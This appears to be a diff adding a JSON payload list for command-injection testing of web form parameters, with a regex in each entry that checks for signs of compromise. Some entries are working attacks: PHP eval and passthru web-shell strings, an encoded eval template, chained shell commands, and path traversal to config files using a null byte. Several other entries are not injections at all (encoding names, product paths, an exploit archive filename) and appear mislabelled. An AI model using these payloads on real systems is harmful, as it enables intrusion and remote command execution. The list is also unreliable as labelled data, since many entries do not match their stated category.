@@ -1,0 +1,189 @@
+[
+  {
+    "payload_id": "OWP-57434",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "swg-informixfpd",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  },
+  {
+    "payload_id": "OWP-57435",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "UTF-8",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  },
+  {
+    "payload_id": "OWP-57436",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "eval%%28base64_decode%%28%%27%s%%27%%29%%29%%3b",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  },
+  {
+    "payload_id": "OWP-57437",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "http://localhost:80/openadmin",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  },
+  {
+    "payload_id": "OWP-57438",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "/opt/IBM/OpenAdmin/OAT/Apache_2.4.2/htdocs/openadmin/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  },
+  {
+    "payload_id": "OWP-57439",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "/opt/IBM/OpenAdmin/OAT/OAT_conf/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  },
+  {
+    "payload_id": "OWP-57440",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "{${eval($_GET[c])}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  },
+  {
+    "payload_id": "OWP-57766",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\"id;ifconfig\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  },
+  {
+    "payload_id": "OWP-58221",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "[RFD]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  },
+  {
+    "payload_id": "OWP-59467",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "'ls -l'",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  },
+  {
+    "payload_id": "OWP-59468",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "'echo start_er;'",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  },
+  {
+    "payload_id": "OWP-61299",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "Download/Exploit#exploit-LRCF-v3.4.rar",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  },
+  {
+    "payload_id": "OWP-61559",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "../../manager/includes/config.inc.php\u0000.htc",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  },
+  {
+    "payload_id": "OWP-62113",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "../admin/.htaccess",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  },
+  {
+    "payload_id": "OWP-62282",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": ";echo 56789;?>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  },
+  {
+    "payload_id": "OWP-62782",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": ";echo \\'",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  },
+  {
+    "payload_id": "OWP-63204",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": ";echo _Hessamx_;passthru(\\$_GET[cmd]);echo _xHessam_;die; ?>\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  }
+]
